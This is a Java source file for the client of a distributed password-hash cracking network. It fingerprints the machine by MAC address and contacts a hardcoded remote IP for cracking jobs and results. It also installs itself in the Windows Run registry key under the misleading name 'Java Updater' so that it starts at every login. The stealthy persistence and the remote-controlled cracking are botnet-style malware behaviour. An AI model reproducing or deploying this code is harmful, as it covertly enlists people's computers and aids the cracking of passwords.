package synthetics;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Formatter;
import java.util.Random;
import synthetics.net.CListenerThread;
import synthetics.net.ServerFindThread;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

//Copyright Kevin Cai & Daniel Greenberg
public class Main {
	public static int[] rateArray = new int[2];
	public static BigInteger[] bounds = new BigInteger[2];
	public static BigInteger lowestNumber = BigInteger.valueOf(0);
	public InetSocketAddress connectionAddress;
	public Socket connectionSocket;
	public volatile DataOutputStream dos;
	public volatile DataInputStream dis;
	public static boolean requestNew = false;
	public static boolean cracking = false;
	public static boolean upperCase = false;
	public static boolean numbers = false;
	public static boolean special = false;
	public static boolean devMode = false;
	public static byte[] comparisonHash;
	public static long hashesThisSecond = 0;
	public static long lastKeepAlive = 0L;
	public CListenerThread lt;
	public static String hostIp = null;
	public static int hostPort = 0;
	public static int maxThreads;
	public static int crackThreads = 0;
	public static boolean connected = false;
	public static boolean sendAverage = false;
	public static int average = -1;
	public static String solution = "";
	public static boolean foundSolution = false;
	public static boolean firstHashSent = false;
	public static String clientID;
	public static String clientMutex;
	public static String launcherHome;
	public static String binLocation = System.getProperty("user.dir");
	public static boolean mutexSent = false;

	public static void main (String args[]) {
		new Main();
	}
	public Main() {
		initiate();
	}
	public void initiate() {
		try {
			InetAddress ip = InetAddress.getLocalHost();
			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
			if(network == null) {
				network = NetworkInterface.getByName("eth0");
			}
			byte[] mac = network.getHardwareAddress();
			StringBuilder sb = new StringBuilder();  
			for (int i = 0; i < mac.length; i++) {  
				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));       
			}
			clientMutex = sb.toString(); //Send to server for check
		} catch (Exception e1) {}
		clientMutex = encryptString(clientMutex);
		System.out.println("GENERATED MUTEX: " + clientMutex);
		clientID = getID();
		System.out.println("GENERATED ID: " + clientID);
		maxThreads = Runtime.getRuntime().availableProcessors();
		try {
			String currentJavaJarFilePath = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName();
			Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			launcherHome = "\"" + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar " + binLocation + "\\" + currentJavaJarFilePath;
			Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Updater", launcherHome);
			System.out.println("[J-Net Client Initializing]");
			if(devMode) {
				System.out.println("[Dev Mode Enabled]");
				(new Thread(new ServerFindThread())).start();
			} else {
				hostIp = "24.51.213.165";
				hostPort = 1800;
			}
			//INSERT THREAD TO SCAN HERE
			//hostIp = "192.168.1.10";
			//hostPort = 8888;
		} catch (Exception e) { out("[FATAL] Failed to load settings"); System.exit(1); }
		(new Thread(new Runnable() {
			public void run() {
				while (true) {
					try {
						int total = 0;
						BigInteger storage = BigInteger.valueOf(0);
						for (int i = 0; i < CrackManager.cr.length; i ++) {
							if (storage.compareTo(BigInteger.valueOf(0)) == 0) {
								storage = CrackManager.bi[i];
							}
							if (CrackManager.bi[i].compareTo(storage) == -1) {
								storage = CrackManager.bi[i];
							}
							total += CrackManager.cr[i].hashesPerSecond;
						}
						lowestNumber = storage;
						hashesThisSecond = total;
					} catch (Exception e) {  }
					try { Thread.sleep(1000); } catch (Exception e) {  }
				}
			}
		})).start();
		(new Thread(new CrackManager())).start();
		Runtime.getRuntime().addShutdownHook((new Thread(new Runnable() {
			public void run() {
				try {
					dos.writeByte(0x01);
					dos.flush();
				} catch (Exception e) {  }
			}
		})));
		while (true) {
			if(ServerFindThread.gotServer || !devMode) {
				try {
					System.out.println("[Attempting to connect...] -- IP: " + hostIp);
					connectionSocket = new Socket();
					connectionAddress = new InetSocketAddress(hostIp, hostPort);
					connectionSocket.setSoTimeout(2500);
					connectionSocket.connect(connectionAddress);
					dos = new DataOutputStream(connectionSocket.getOutputStream());
					dis = new DataInputStream(connectionSocket.getInputStream());
					dis.read();
					dos.writeByte(0x00);
					dos.flush();
					System.out.println("[Connected to Server]");

					//MUTEX SENDING
					if(!mutexSent) {
						dos.write(0x09);
						dos.flush();
						writeString(clientMutex, dos);
						System.out.println("WROTE STRING HASH: " + clientMutex);
						dos.flush();
						mutexSent = true;
					}

					lt = new CListenerThread(dis);
					(new Thread(lt)).start();
					connected = true;
					(new Thread(new Runnable() {
						public void run() {
							while (connected) {
								try {
									int lastKnownHashes = 0;
									int sendHashes = 0;
									if (System.currentTimeMillis() - lastKeepAlive > 1000) {
										dos.writeByte(0x00);
										dos.flush();
										if (cracking) {
											dos.writeByte(0x02);
											dos.flush();
											double chashRate = hashesThisSecond/1000;
											for(int i=0; i<rateArray.length; i++) {
												chashRate = (int) chashRate;
												if(chashRate != 0) {
													//System.out.println(i);
													if(chashRate != rateArray[0]) {
														if(rateArray[0] == 0) {
															rateArray[0] = (int) chashRate;
														} else {
															rateArray[1] = rateArray[0];
															rateArray[0] = (int) chashRate;
														}
													}
												}
											}
											//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));

											if(chashRate == 0 && !firstHashSent && lastKnownHashes == 0) {
												//System.out.println("FIRST hash 2000! Now hash is: " + nowHashes);
												firstHashSent = true;
											}

											if(chashRate != 0 && firstHashSent) {
												lastKnownHashes = (int) chashRate;
											}

											if(chashRate == 0 && lastKnownHashes == 0 && firstHashSent) {
												double sum = 0;
												//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));
												for(int i = 0; i < rateArray.length; i++) {
													sum += rateArray[i];
												}
												double placeholder = sum / rateArray.length;
												if(placeholder != 0) {
													lastKnownHashes = (int) placeholder;
												} else {
													lastKnownHashes = 2400;
												}
											}
											sendHashes = lastKnownHashes;
											//if(sendHashes == 0) {System.out.println("FUCK I SENT A 0" + " THE LAST IS: " + lastKnownHashes + " THE NOW IS: " + nowHashes);}
											System.out.println("[R]: " + sendHashes);
											dos.writeInt(sendHashes);
											dos.flush();
											dos.writeByte(0x03);
											dos.flush();
											writeBigInteger(lowestNumber, dos);
											dos.flush();
										}
										lastKeepAlive = System.currentTimeMillis();
									}
									if (foundSolution) {
										dos.write(0x04);
										dos.flush();
										writeString(solution, dos);
										dos.flush();
										foundSolution = false;
									}
									//if (sendAverage) {
									//sendAverage = false;
									dos.write(0x05);
									dos.flush();
									//System.out.println(average);
									dos.writeInt(average);
									dos.flush();
									//}
									if (requestNew) {
										requestNew = false;
										dos.write(0x06);
										dos.flush();
									}
									dos.write(0x07);
									dos.flush();
									dos.writeBoolean(cracking);
									dos.flush();

									dos.write(0x08);
									dos.flush();
									writeString(clientID, dos);
									dos.flush();

									Thread.sleep(20);
								} catch (Exception e) {  }
							}
						}
					})).start();
					while (connected) {
						Thread.sleep(200);
					}
				} catch (Exception e) { connected = false; }
				try { connected = false; Thread.sleep(10000); } catch (Exception e) {  }
			}
		}
	}

	public String getFileString(String filename) throws Exception {
		String s13 = "";
		InputStream in = getClass().getClassLoader().getResourceAsStream(filename);
		DataInputStream datainputstream = new DataInputStream(in);
		BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(datainputstream));
		String line;
		while ((line = bufferedreader.readLine()) != null) {
			s13 += line;
		}
		bufferedreader.close();
		datainputstream.close();
		in.close();
		return s13;
	}

	private static String getID() {
		String output = "";
		int randAIndex;
		int randNIndex;
		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVXYZ";
		String numbers = "0123456789";
		int AL = alphabet.length();
		int NL = numbers.length();
		Random rGen = new Random();
		for (int i=0; i<2; i++) {
			randAIndex = rGen.nextInt(AL);
			randNIndex = rGen.nextInt(NL);
			output = Character.toString(alphabet.charAt(randAIndex));
			output += Character.toString(numbers.charAt(randNIndex));
		}
		return output;
	}

	private static String encryptString(String password)
	{
		String sha1 = "";
		try
		{
			MessageDigest crypt = MessageDigest.getInstance("SHA-1");
			crypt.reset();
			crypt.update(password.getBytes("UTF-8"));
			sha1 = byteToHex(crypt.digest());
		}
		catch(NoSuchAlgorithmException e)
		{
			e.printStackTrace();
		}
		catch(UnsupportedEncodingException e)
		{
			e.printStackTrace();
		}
		return sha1;
	}

	private static String byteToHex(final byte[] hash)
	{
		Formatter formatter = new Formatter();
		for (byte b : hash)
		{
			formatter.format("%02x", b);
		}
		String result = formatter.toString();
		formatter.close();
		return result;
	}

	public static BigInteger power (int number, int exponent) {
		BigInteger num = BigInteger.valueOf(1);
		for (int i = 0; i < exponent; i ++) {
			num = num.multiply(BigInteger.valueOf((long)(number)));
		}
		return num;
	}

	public static void out(String output) {
		System.out.println(output);
	}

	public void writeString(String par0Str, DataOutputStream par1DataOutputStream) throws IOException {
		if (par0Str.length() > 32767) {
			throw new IOException("String too big");
		} else {
			par1DataOutputStream.writeShort(par0Str.length());
			par1DataOutputStream.writeChars(par0Str);
			return;
		}
	}

	public void writeBigInteger(BigInteger big, DataOutputStream par1DataOutputStream) throws IOException {
		byte[] data = big.toByteArray();
		int length = data.length;
		par1DataOutputStream.writeInt(length);
		for (int i = 0; i < length; i++) {
			par1DataOutputStream.writeByte(data[i]);
		}
		return;
	}
}